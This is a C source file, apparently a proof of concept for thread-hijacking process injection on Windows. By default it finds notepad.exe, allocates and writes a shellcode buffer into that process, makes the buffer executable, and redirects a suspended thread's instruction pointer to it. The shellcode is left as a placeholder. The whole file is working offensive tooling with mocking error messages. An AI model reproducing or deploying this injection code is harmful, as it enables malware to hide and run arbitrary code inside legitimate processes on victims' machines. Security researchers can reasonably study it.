#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <WinBase.h>



BOOL InjectShellMeow(HANDLE hProcess, PBYTE pShellCode, SIZE_T sSizeOfShellCode, PVOID* ppAddress) {

	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellCode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t [!] VirtualAllocEx FAILED WITH ERROR : %d\n");
		return FALSE;
	}
	char* art = "                                                             .:-                                    \n"
		"                                                              .-                                    \n"
		"                                                              :-                                    \n"
		"                                                             .=.                                    \n"
		"                                           .. ....          .+.                                      \n"
		"                                           -. -..:        .-=.                                      \n"
		"                                 .        :=.:=.--.+#*--=*+..                                        \n"
		"                                 .:.      =-.=+-#*@@@@@+:..                                          \n"
		"                                  .-+.    *-:#@@@@#@@@@#***+=:.                                      \n"
		"                                    .=+..-@@@@%@@%%+*#%:    ..-+:                                    \n"
		"                               .     .+##%%@@@##*%#+-:..      ..-+.                                 \n"
		"                             .:=-==-:-#%%@@%%%#+*=:::--.         .=.                                 \n"
		"                                  .-*#%@@%@@--#=-:-+:             .:.                                \n"
		"                              .... .#%%%@@%-==*+:+-.              ..                                 \n"
		"                            .=-=-=**%@@@@@==+#=.-::.                                                 \n"
		"                            ...  .:#%%%@@#++++==+:.                                                  \n"
		"                              .:-:+#%@@@@%#****+-.                                                   \n"
		"                           .:==:::=##%@%*--=+=-:..                                                   \n"
		"                          ...     =%%@@@%@+-....::.                                                  \n"
		"                              ..+###%@@@@%:-*+#=.-=.....                                             \n"
		"                             :+=:..=%%@@@###-.+*+...=-..  ..                                        \n"
		"                           ....   ..#%#%@@%*+%=..=#=....-=.                                          \n"
		"                                -**==+**#@@@%%#*#-. .:+#+.                                           \n"
		"                              .=:     :#%#%@@%**%+..#%=.                                             \n"
		"                              ..      :+#*##*@@@@%**#:    .:-=+:..                                  \n"
		"                                    .+#:..-*####%@@@@*+=**+--.                                       \n"
		"                                    --    .**+##+*%%%@#%#..   ...:=-.                                \n"
		"                                   .-.    **..-%**#+%%*@###+##**-...                                 \n"
		"                                   ..    -+..+*=..##*#%@%%%%+...      ..                             \n"
		"                                        .-  -*. .+#+=#+*%@@%#....-=*+:.                              \n"
		"                                        ....+.  ++..=#*+=%@@@@%#+=..                                 \n"
		"                                          .:.  :=.:#*-.++*%@@@+..                                    \n"
		"                                              .-.++::+*###%@@@*.                                     \n"
		"                                              :=::=+=-..##%@@@@=-...                                 \n"
		"                                              .:....-+##*##%@@@#+*+##=::.                            \n"
		"                                              ...:--::..:%#%@@%:  ..                                 \n"
		"                                                   .-+##%#%@@@@=..                                   \n"
		"                                              ....*+=..=%%##@@#=*#=..                                \n"
		"                                             .-+++*#+*#%%@@@@%....-++.                               \n"
		"                                          .:----::.:::+##@@@@#.     ..::                             \n"
		"                                             ..:====**%%%%%@*+*:                                     \n"
		"                                            .......+#@#%@@@:  :*+.                                     \n"
		"                                      ...-==***##@*@@%@@%@*:   .-#.                                  \n"
		"                                      .....::..:+%%%@@@@+.**.    .:-.                                \n"
		"                                            .=%*+=#%%%%:  .*+.     .                                 \n"
		"                                        ...+##**-+@*.-*.   .=*.                                      \n"
		"                                      .:%%=:*%*=...  ++.    .:+.                                     \n"
		"                                  .-+*+=+%%*-.      .*+.      .:.                                    \n"
		"                                ....:##=..          .=+.                                             \n"
		"                                 .......             :=.                                             \n"
		"                                                    .-.                                              \n"
		"                                                    .                                                \n";

	printf("%s", art);
	printf("                     [ ====================  THREAD HIJACKING POC =================== ]");


	if (!WriteProcessMemory(hProcess, *ppAddress, pShellCode, sSizeOfShellCode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellCode) {
		printf("\n\t[!] WriteProcessMemory FAILED WITH A Stupid ERROR !! : %d \n");
		return FALSE;
	}
	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellCode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Meow : %d \n");
		return FALSE;
	}

	return TRUE;

}

BOOL GetProcess(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
	PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) }; 
	HANDLE hSnapShot = NULL;

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); 
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	if (!Process32First(hSnapShot, &Proc)) { 
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		CloseHandle(hSnapShot);
		return FALSE;
	}
	while (Process32Next(hSnapShot, &Proc)) { 
		WCHAR LowerName[MAX_PATH * 2]; 
		if (Proc.szExeFile) { 
			DWORD dwSize = lstrlenW(Proc.szExeFile); 
			DWORD i = 0;



			if (dwSize < MAX_PATH * 2) { 
				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
				LowerName[i++] = '\0';
			}
			if (wcscmp(LowerName, szProcessName) == 0) {
				*dwProcessId = Proc.th32ProcessID;	
				*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
				if (*hProcess == NULL) {
					printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
					CloseHandle(hSnapShot);
					return FALSE;
				}
				break;
			}
		}
	}
	CloseHandle(hSnapShot);
	return TRUE;
}

BOOL GetRemoteThreadhandle(IN DWORD dwProcessId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {

	HANDLE hSnapShot = NULL;
	THREADENTRY32 Thr = { .dwSize = sizeof(THREADENTRY32) };
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapszot Failed With Error: %d \n", GetLastError());
		return FALSE;
	}
	
	while (Thread32Next(hSnapShot, &Thr)) {

		if (Thr.th32OwnerProcessID == dwProcessId) {
			*dwThreadId = Thr.th32ThreadID; 
			*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID); 
			if (*hThread == NULL) {
				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());
				CloseHandle(hSnapShot);
				return FALSE;
			}
			break;
		}
	}
	CloseHandle(hSnapShot);
	return TRUE;
}
BOOL ThreadTypeOfShit(IN HANDLE hThread, IN PVOID pAddress) {

	CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_ALL };

	SuspendThread(hThread);

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] GetThreadContext Failed With Error : %d \n");
		return FALSE;
	}

	ThreadCtx.Rip = pAddress;
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] SetThreadContext Failed With Error : %d \n");
		return FALSE;
	}
	ResumeThread(hThread); 
	WaitForSingleObject(hThread, INFINITE);
	return TRUE;

	}

int main() {

	LPWSTR lpProcessName = L"notepad.exe"; // choose the process name here 
	DWORD dwProcessId;
	HANDLE hProcess;
	DWORD dwThreadId;
	HANDLE hThread;
	PVOID pAddress;
	unsigned char shellcode[] = "Your Shell Code Here";

	GetProcess(lpProcessName, &dwProcessId, &hProcess);
	GetRemoteThreadhandle(dwProcessId, &dwThreadId, &hThread);
	InjectShellMeow(hProcess, shellcode, sizeof(shellcode), &pAddress);
	ThreadTypeOfShit(hThread, pAddress);
	return 0;
}
